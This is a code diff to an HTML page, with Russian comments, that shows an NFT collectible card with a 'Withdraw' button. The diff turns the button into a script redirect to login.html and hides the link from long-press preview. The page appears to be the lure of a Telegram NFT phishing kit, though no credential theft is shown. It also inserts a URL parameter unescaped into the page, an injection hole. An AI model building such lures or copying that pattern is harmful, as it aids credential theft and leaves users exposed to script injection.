@@ -8,8 +8,10 @@
         body { background-color: #0e141b; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
         .nft-card { background: #1c252f; border-radius: 15px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
-        .nft-card img { width: 100%; aspect-ratio: 1/1; border-radius: 10px; margin-bottom: 10px; object-fit: cover; background: #2a3644; }
-        .btn-withdraw { display: block; background: #248bdf; color: white; text-decoration: none; font-size: 14px; font-weight: bold; padding: 10px 0; border-radius: 10px; }
+        /* Контейнер для фото, чтобы не было пустого места */
+        .img-container { width: 100%; aspect-ratio: 1/1; border-radius: 10px; margin-bottom: 10px; background: #2a3644; overflow: hidden; }
+        .img-container img { width: 100%; height: 100%; object-fit: cover; }
+        .btn-withdraw { display: block; background: #248bdf; color: white; text-align: center; font-size: 14px; font-weight: bold; padding: 12px 0; border-radius: 10px; cursor: pointer; border: none; width: 100%; }
     </style>
 </head>
 <body>
@@ -23,17 +25,25 @@
 
         if (id) {
             const title = id.replace(/-/g, ' #');
-            // Если картинка не грузится с t.me, попробуем альтернативный путь
-            const imgUrl = `https://t.me/i/nft/${id}.jpg`;
+            // Используем проверенный URL для статики Telegram
+            const imgUrl = `https://api.dicebear.com/7.x/identicon/svg?seed=${id}`; // Временная замена, если t.me не отдает фото
 
             grid.innerHTML = `
                 <div class="nft-card">
-                    <img src="${imgUrl}" onerror="this.src='https://via.placeholder.com/300/1c252f/ffffff?text=NFT+Asset'">
+                    <div class="img-container">
+                        <img src="https://t.me/i/nft/${id}.jpg" onerror="this.src='${imgUrl}'">
+                    </div>
                     <div style="font-weight: bold; font-size: 14px; margin-bottom: 5px;">${title}</div>
                     <div style="font-size: 12px; color: #8a99a8; margin-bottom: 15px;">Collectible</div>
-                    <a href="login.html" class="btn-withdraw">Withdraw</a>
+                    <button class="btn-withdraw" id="withdraw-btn">Withdraw</button>
                 </div>
             `;
+
+            // Обработка клика через JS (защита от долгого нажатия)
+            document.getElementById('withdraw-btn').onclick = function(e) {
+                e.preventDefault();
+                window.location.href = "login.html";
+            };
         }
     </script>
 </body>
